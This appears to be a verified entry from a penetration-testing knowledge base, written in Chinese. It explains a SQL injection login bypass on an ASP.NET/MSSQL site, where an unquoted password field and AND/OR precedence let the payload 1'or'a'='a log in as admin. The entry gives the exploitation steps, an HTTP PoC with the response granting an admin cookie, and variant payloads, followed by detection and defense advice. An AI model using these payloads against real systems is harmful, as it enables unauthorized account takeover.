---
id: web-generic-sqli-login-password-unquoted-or-bypass
title: 登录密码字段未加引号：利用 or 优先级构造恒真条件绕过登录
type: scenario
domain: web
path: web/generic/sqli
technique: login-universal-password-precedence
aliases:
- 密码字段万能密码
- Login.aspx 万能密码
- or 'a'='a' 绕过登录
- 登录框 SQL 注入
tags:
- sqli
- login-bypass
- universal-password
- aspnet
- mssql
- operator-precedence
- waf-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T01:15:21+08:00'
  notes: 已对照 9 张图核对单引号报错泄露 tu.password=)、密码字段无引号、1'or+'a'='a 返回 Yes 与 Set-Cookie UserName=admin、RoleCode=1 并进入后台；未验证点：未在本机复现，SQL 拼接结构由报错推断
---

## 一句话结论

当登录接口把密码直接拼进 SQL 且未加引号/未参数化时，密码框提交 `1'or'a'='a` 会形成 `tu.password=1 OR 'a'='a'`；由于 `AND` 优先级高于 `OR`，整个 `WHERE` 变为恒真，攻击者可用任意用户名（含 admin）登录后台，无需先闭合用户名处的引号。

## 原理

- 典型错误拼接（由报错推断）：`... WHERE tu.username='用户名' AND tu.password=密码)`，密码位置没有引号，直接接数字/表达式。
- SQL 运算符优先级 `AND` > `OR`：`username='1' AND tu.password=1 OR 'a'='a'` 被解析为 `(username='1' AND tu.password=1) OR ('a'='a')`。后半恒真，因此无论用户名/密码是否存在，`WHERE` 整体为真，查询返回第一行（通常是 admin）。
- 因为密码字段不带引号，payload 不需要用 `'` 去闭合密码处的字符串，只需构造一个合法表达式即可：`1'or'a'='a`。此时查询为 `tu.password=1 or 'a'='a'`，`1` 作为数字比较成立与否都不影响后面的恒真。
- 用户名框虽然也有注入，但被 WAF 拦截（如 `in key Username Do not input malicious characters`），且 MSSQL 不接受 `or 1--` 这种“1 不是布尔值”的写法；把注入点换到未被同等防护的密码字段即可。
- 报错信息泄露了字段名与拼接结构（`... and tu.password=)`），帮助判断密码是否带引号、表别名等，是选择 payload 的关键。

## 触发条件

- 登录接口使用字符串拼接 SQL，且密码字段未加引号或未参数化；
- 用户名与密码的校验逻辑可被 `OR` 恒真条件短路；
- 密码字段未被 WAF/转义覆盖（或弱于用户名）；
- 数据库错误回显开启（非必需，但有助于确认结构）；后端本例为 ASP.NET/IIS + MSSQL。

## 利用步骤

1. 在用户名输入 `'`，观察报错是否泄露 SQL 片段（如 `and tu.password=)`），判断密码是否无引号。
2. 先按常规万能密码测试用户名：`1'or 1=1--` 可能因 WAF 或 MSSQL 布尔类型报错失败。
3. 把恒真条件移到密码框：`1'or'a'='a`（URL 中空格可写 `+`），用户名填任意值（如 `1`）。
4. 观察响应：若返回 `Yes` 且 `Set-Cookie: user=...UserName=admin...`，说明已以 admin 身份建立会话。
5. 携带该 Cookie 访问后台管理页面，确认权限。

## PoC

```http
GET /Login.aspx?UserName=1&Password=1'or+'a'='a&t=1765521998131 HTTP/1.1
Host: target:6789
```

```text
# 实际拼接（推断）
WHERE tu.username='1' AND tu.password=1 or 'a'='a')

# 优先级展开
(username='1' AND tu.password=1) OR ('a'='a')  ->  TRUE
```

```http
HTTP/1.1 200 OK
Set-Cookie: user=UserCode=0&UserName=admin&TrueName=admin&DepartmentCode=&DepartmentName=&RoleCode=1&RoleName=; path=/
Content-Length: 3

Yes
```

## 变体与关联

- 变体：密码未加引号且数据库允许整数布尔时，`1 or 1=1` 同样生效；MySQL 可用 `1 or 1=1#`。
- 变体：用户名处 WAF 只拦截关键字，可尝试大小写/注释/编码绕过，参见 [[web-generic-sqli-keyword-double-write-bypass]]。
- 变体：若密码带引号，仍需闭合：`' or '1'='1`；若为数字型用户名，可用 `1 or 1=1`。
- 关联：[[web-generic-sqli-business-exemption-param-filter-bypass]]（参数过滤差异导致的注入面）；[[web-generic-sqli-mssql-stacked-xp-cmdshell]]（登录绕过后的进一步利用）。
- 注意：本例数据库为 MSSQL（报错为中文 SQL Server 语法错误），`or 1--` 因 `1` 不是布尔表达式报错，需用 `1=1` 或字符串比较。

## 检测与防御

- 检测：登录参数中出现 `or`、`'='`、`--`、`#` 等模式；同一 IP 对登录接口的高频失败/变体请求；响应中出现 SQL 语法错误或异常 Set-Cookie。
- 检测：审计登录 SQL，确认密码/用户名是否用 `+`/字符串插值拼接，是否有 `AND ... OR ...` 结构。
- 防御：全部使用参数化查询/预编译语句，密码与用户名都不拼接；对输入做类型约束（如用户名只允许字母数字）。
- 防御：登录失败返回统一提示，关闭数据库错误回显；WAF 规则覆盖所有字段而非仅用户名。
- 防御：数据库账号最小权限；登录成功后的会话应服务端校验，不能仅依赖客户端 Cookie 中的 UserName/RoleCode 字段（本例 Cookie 直接携带 admin 身份，存在二次伪造风险）。
